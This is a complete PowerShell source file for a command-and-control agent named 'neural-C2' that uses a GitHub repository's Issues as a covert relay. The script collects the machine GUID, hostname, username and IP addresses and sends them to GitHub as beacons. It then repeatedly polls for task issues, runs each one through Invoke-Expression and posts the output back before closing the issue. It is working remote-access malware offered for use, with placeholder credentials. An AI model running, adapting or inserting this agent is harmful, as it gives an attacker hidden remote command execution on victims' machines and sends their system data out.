param (
    [string]$CustomAgentId = ""
)

# ============================================================
#  neural-C2 GitHub Agent
#  Uses GitHub Issues as the C2 relay — no server needed
# ============================================================

# ── CONFIGURE THESE ───────────────────────────────────────────────────────────
$GitHubToken = "<github-token>"                                  # Your token
$GitHubRepo  = "githubusername/reponame"                         # Your GitHub repo
$PollInterval   = 10    # seconds between task checks
$BeaconInterval = 60    # seconds between heartbeat beacons
# ─────────────────────────────────────────────────────────────────────────────

$Headers = @{
    "Authorization"        = "Bearer $GitHubToken"
    "Accept"               = "application/vnd.github+json"
    "X-GitHub-Api-Version" = "2022-11-28"
}
$BaseUrl = "https://api.github.com/repos/$GitHubRepo"

# ── Collect system info ───────────────────────────────────────────────────────
function Get-AgentId {
    if ($CustomAgentId) { return $CustomAgentId }
    try {
        $guid = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Cryptography" -Name "MachineGuid").MachineGuid
        return "$guid-$PID"
    } catch {
        return "temp-$([System.Guid]::NewGuid().ToString())-$PID"
    }
}

function Get-PrivateIP {
    try {
        $ip = (Get-NetIPAddress -AddressFamily IPv4 |
               Where-Object { $_.PrefixOrigin -ne 'WellKnown' -and $_.IPAddress -notlike '127.*' } |
               Select-Object -First 1).IPAddress
        return if ($ip) { $ip } else { "unknown" }
    } catch { return "unknown" }
}

function Get-PublicIP {
    try {
        return (Invoke-RestMethod -Uri "https://api.ipify.org?format=json" -TimeoutSec 5).ip
    } catch {
        try { return (Invoke-RestMethod -Uri "https://ifconfig.me/ip" -TimeoutSec 5).Trim() }
        catch { return "unknown" }
    }
}

# ── GitHub API helpers ────────────────────────────────────────────────────────
function Invoke-GH {
    param($Method, $Endpoint, $Body = $null)
    $params = @{
        Uri     = "$BaseUrl$Endpoint"
        Method  = $Method
        Headers = $Headers
    }
    if ($Body) {
        $params.Body        = ($Body | ConvertTo-Json -Depth 10)
        $params.ContentType = "application/json"
    }
    return Invoke-RestMethod @params
}

function Ensure-Labels {
    $labels = @(
        @{ name="c2-task";  color="e11d48"; description="C2 task command" },
        @{ name="c2-agent"; color="0ea5e9"; description="C2 agent beacon" },
        @{ name="c2-done";  color="16a34a"; description="C2 task completed" }
    )
    foreach ($label in $labels) {
        try { Invoke-GH -Method POST -Endpoint "/labels" -Body $label | Out-Null } catch {}
    }
}

# ── Send agent beacon ─────────────────────────────────────────────────────────
function Send-Beacon {
    param($AgentId, $Hostname, $Username, $PrivateIP, $PublicIP)

    $info = @{
        agent_id   = $AgentId
        hostname   = $Hostname
        username   = $Username
        private_ip = $PrivateIP
        public_ip  = $PublicIP
        timestamp  = (Get-Date -Format "o")
    }

    # Check if a beacon issue already exists for this agent
    $existing = Invoke-GH -Method GET -Endpoint "/issues?labels=c2-agent&state=open&per_page=100"
    $myIssue  = $existing | Where-Object { $_.title -like "AGENT:$AgentId*" } | Select-Object -First 1

    if ($myIssue) {
        # Post heartbeat as comment
        Invoke-GH -Method POST -Endpoint "/issues/$($myIssue.number)/comments" `
            -Body @{ body = ($info | ConvertTo-Json -Compress) } | Out-Null
    } else {
        # First beacon — create the issue
        Invoke-GH -Method POST -Endpoint "/issues" -Body @{
            title  = "AGENT:$AgentId | $Username@$Hostname"
            body   = ($info | ConvertTo-Json -Depth 5)
            labels = @("c2-agent")
        } | Out-Null
        Write-Host "[+] Registered agent on GitHub"
    }
}

# ── Fetch pending tasks for this agent ───────────────────────────────────────
function Fetch-Tasks {
    param($AgentId)
    try {
        $issues = Invoke-GH -Method GET -Endpoint "/issues?labels=c2-task&state=open&per_page=100"
        $myTasks = $issues | Where-Object {
            $body = $_.body | ConvertFrom-Json -ErrorAction SilentlyContinue
            ($body.target_agent -eq $null -or $body.target_agent -eq "" -or $body.target_agent -eq $AgentId)
        }
        return $myTasks
    } catch {
        Write-Warning "[!] Error fetching tasks: $_"
        return @()
    }
}

# ── Execute a task and post result ────────────────────────────────────────────
function Execute-Task {
    param($Issue, $AgentId)

    $taskBody   = $Issue.body | ConvertFrom-Json -ErrorAction SilentlyContinue
    $command    = if ($taskBody.command) { $taskBody.command } else { $Issue.body }
    $issueNum   = $Issue.number

    Write-Host "[+] Executing Task #$issueNum : $command"
    $output = ""

    try {
        $output = Invoke-Expression $command 2>&1 | Out-String
    } catch {
        $output = "Error: $_"
    }

    $result = @{
        agent_id   = $AgentId
        hostname   = $env:COMPUTERNAME
        command    = $command
        output     = $output.Trim()
        executed_at = (Get-Date -Format "o")
    }

    # Post result as a comment
    Invoke-GH -Method POST -Endpoint "/issues/$issueNum/comments" `
        -Body @{ body = ($result | ConvertTo-Json -Compress) } | Out-Null

    # Close the issue (mark completed)
    Invoke-GH -Method PATCH -Endpoint "/issues/$issueNum" `
        -Body @{ state = "closed"; labels = @("c2-done") } | Out-Null

    Write-Host "[+] Result posted for Task #$issueNum"
}

# ═══════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════
$AgentId   = Get-AgentId
$Hostname  = $env:COMPUTERNAME
$Username  = $env:USERNAME
$PrivateIP = Get-PrivateIP
$PublicIP  = Get-PublicIP

Write-Host "============================================"
Write-Host "  neural-C2 GitHub Agent"
Write-Host "  Agent ID   : $AgentId"
Write-Host "  Host       : $Username@$Hostname"
Write-Host "  Private IP : $PrivateIP"
Write-Host "  Public IP  : $PublicIP"
Write-Host "  Repo       : $GitHubRepo"
Write-Host "============================================"

Ensure-Labels

# Initial beacon
Write-Host "[*] Sending beacon to GitHub..."
Send-Beacon -AgentId $AgentId -Hostname $Hostname -Username $Username `
    -PrivateIP $PrivateIP -PublicIP $PublicIP
Write-Host "[+] Connected! Polling for tasks every $PollInterval s..."

$lastBeacon = Get-Date

while ($true) {
    try {
        # Heartbeat
        if ((New-TimeSpan -Start $lastBeacon -End (Get-Date)).TotalSeconds -ge $BeaconInterval) {
            Send-Beacon -AgentId $AgentId -Hostname $Hostname -Username $Username `
                -PrivateIP $PrivateIP -PublicIP $PublicIP
            $lastBeacon = Get-Date
        }

        # Fetch and execute tasks
        $tasks = Fetch-Tasks -AgentId $AgentId
        foreach ($task in $tasks) {
            Execute-Task -Issue $task -AgentId $AgentId
        }
    } catch {
        Write-Warning "[!] Loop error: $_"
    }

    Start-Sleep -Seconds $PollInterval
}
